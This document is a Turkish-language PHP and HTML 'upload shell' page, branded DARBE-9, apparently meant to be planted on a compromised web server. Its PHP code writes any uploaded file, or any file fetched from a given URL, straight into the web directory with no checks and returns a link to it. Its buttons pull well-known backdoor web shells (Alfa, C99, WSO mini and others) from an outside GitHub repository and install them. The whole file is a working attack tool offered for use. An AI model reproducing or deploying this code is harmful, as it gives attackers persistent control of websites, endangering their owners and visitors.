<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* DARBE-9 UPLOAD SHELL */
        @keyframes glitch {
            0% { transform: none; }
            20% { transform: translate(-1px, -1px); }
            40% { transform: translate(1px, 1px); }
            60% { transform: translate(-1px, 1px); }
            80% { transform: translate(1px, -1px); }
            100% { transform: none; }
        }
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .upload-form {
            background-color: #111;
            width: 90%;
            max-width: 400px;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #0f0; /* Çerçeve rengi */
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            box-sizing: border-box;
        }
        .upload-form h2 {
            text-align: center;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .upload-form p {
            color: #0f0;
            text-shadow: 0 0 3px #0f0;
        }
        .upload-form input[type="file"],
        .upload-form input[type="text"] {
            margin-bottom: 10px;
            background-color: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 5px;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
        }
        .upload-form input[type="submit"].upload-button {
            background-color: #f00; /* "Dosya Yükle" ve "Link ile Dosya Yükle" butonları kırmızı */
            color: #000; /* Yazı rengi siyah */
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            animation: glitch 0.2s infinite alternate;
            width: 100%;
            box-sizing: border-box;
        }
        .upload-form input[type="submit"].upload-button:hover {
            background-color: #ff4444;
        }
        .message {
            text-align: center;
            margin-top: 20px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .message a {
            color: #00f;
            text-decoration: none;
        }
        .message a:hover {
            text-decoration: underline;
        }
        .hack-buttons {
            text-align: center;
            margin-top: 20px;
        }
        .hack-button {
            background-color: #0f0; /* Diğer butonlar yeşil */
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 5px;
            animation: glitch 0.2s infinite alternate;
            width: 100%;
            box-sizing: border-box;
        }
        .hack-button:hover {
            background-color: #00cc00;
        }
        @media (max-width: 600px) {
            body {
                flex-direction: column;
                padding: 10px;
            }
            .upload-form {
                width: 100%;
                padding: 15px;
                border: 1px solid #0f0; /* Çerçeve rengi */
            }
            .upload-form input[type="submit"].upload-button,
            .hack-button {
                padding: 10px;
            }
            .message {
                margin-top: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="upload-form">
        <h2>DARBE-9</h2>
        <form class="upload" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
            <p>"Sistem güvenliği bakkala gönderildi"</p>
            <input type="file" name="uploaded_file" placeholder="Hedef dosya seç...">
            <input type="submit" name="file_upload_submit" value="Dosya Yükle" class="upload-button">
            <p>veya URL girin:</p>
            <input type="text" name="file_url" placeholder="Dosya URL'si">
            <input type="submit" name="url_upload_submit" value="Link ile Dosya Yükle" class="upload-button">
        </form>
        <div class="message">
            SHELL SEÇ
        </div>
        <div class="hack-buttons">
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/3.php')">C99 Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/4.php')">WsoMini Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/5.php')">k2ll33d Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/6.php')">spademini Yükle</button>
        </div>
    </div>
    <script>
        function uploadFile(url) {
            // Form öğesini al
            var form = document.querySelector('.upload');

            // URL değerini içeren gizli bir input alanı ekleyin
            var urlInput = document.createElement('input');
            urlInput.type = 'hidden';
            urlInput.name = 'file_url';
            urlInput.value = url;
            form.appendChild(urlInput);

            // Formu gönder
            form.submit();
        }
    </script>
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['url_upload_submit']) && isset($_POST["file_url"])) {
            $url = $_POST["file_url"];
            $fileContent = file_get_contents($url);
            if ($fileContent !== false) {
                $fileName = basename($url);
                $uploadDirectory = "";
                if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
                    echo "<div class='message'>Dosya başarıyla yüklendi. Shell linki: <a href='$uploadDirectory$fileName' target='_blank'>$uploadDirectory$fileName</a></div>";
                } else {
                    echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
                }
            } else {
                echo "<div class='message'>Dosya indirilirken bir hata oluştu!</div>";
            }
        } else {
            if (!empty($_FILES['uploaded_file'])) {
                $uploadKlasoru = "";
                $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
                if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
                    echo "<div class='message'>Dosya " . basename($_FILES['uploaded_file']['name']) . " başarıyla yüklendi. <a href='$dosyaYolu' target='_blank'>Dosyayı Aç</a></div>";
                } else {
                    echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
                }
            }
        }
    }
    ?>
</body>
</html>
